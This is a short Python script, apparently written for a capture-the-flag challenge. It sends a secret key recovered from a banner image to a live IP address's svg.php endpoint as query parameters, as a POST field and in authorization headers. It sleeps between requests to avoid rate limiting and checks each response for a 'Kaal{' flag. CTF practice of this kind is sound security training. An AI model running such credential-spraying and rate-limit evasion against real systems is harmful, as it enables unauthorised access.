#!/usr/bin/env python3
"""
Use the secret key found in the banner image
"""

import requests
import time

TARGET_URL = "http://138.199.163.92:12669/"
SECRET_KEY = "Th1s_is_4_Str0ng_M4ster_Secret_Key_2026!!"

print("="*60)
print("USING SECRET KEY")
print("="*60)
print(f"\nSecret Key: {SECRET_KEY}")

# Wait a bit to avoid rate limit
print("\n[*] Waiting 10 seconds to avoid rate limit...")
time.sleep(10)

# Try the key as different parameters
params_to_try = [
    {'secret': SECRET_KEY},
    {'key': SECRET_KEY},
    {'token': SECRET_KEY},
    {'password': SECRET_KEY},
    {'auth': SECRET_KEY},
]

for params in params_to_try:
    print(f"\n[*] Trying with {list(params.keys())[0]}...")
    try:
        resp = requests.get(TARGET_URL + "svg.php", params=params, timeout=10)
        print(f"  Status: {resp.status_code}")
        print(f"  Length: {len(resp.text)} bytes")
        
        if resp.status_code == 200 and len(resp.text) != 107039:
            print(f"  [!] Different response!")
            print(f"  Content preview: {resp.text[:500]}")
            
            # Check for flag
            if 'Kaal{' in resp.text or 'kaal{' in resp.text.lower():
                print(f"\n{'='*60}")
                print(f"FLAG FOUND!")
                print(f"{'='*60}")
                print(resp.text)
                break
        
        # Wait between requests
        time.sleep(2)
    except Exception as e:
        print(f"  Error: {e}")

# Try POST
print("\n[*] Trying POST request...")
try:
    resp = requests.post(TARGET_URL + "svg.php", data={'secret': SECRET_KEY}, timeout=10)
    print(f"  Status: {resp.status_code}")
    print(f"  Content: {resp.text[:500]}")
    
    if 'Kaal{' in resp.text or 'kaal{' in resp.text.lower():
        print(f"\n{'='*60}")
        print(f"FLAG FOUND!")
        print(f"{'='*60}")
        print(resp.text)
except Exception as e:
    print(f"  Error: {e}")

# Try as header
print("\n[*] Trying as header...")
try:
    headers = {'X-Secret': SECRET_KEY, 'Authorization': f'Bearer {SECRET_KEY}'}
    resp = requests.get(TARGET_URL + "svg.php", headers=headers, timeout=10)
    print(f"  Status: {resp.status_code}")
    print(f"  Length: {len(resp.text)} bytes")
    
    if 'Kaal{' in resp.text or 'kaal{' in resp.text.lower():
        print(f"\n{'='*60}")
        print(f"FLAG FOUND!")
        print(f"{'='*60}")
        print(resp.text)
except Exception as e:
    print(f"  Error: {e}")

print("\n" + "="*60)
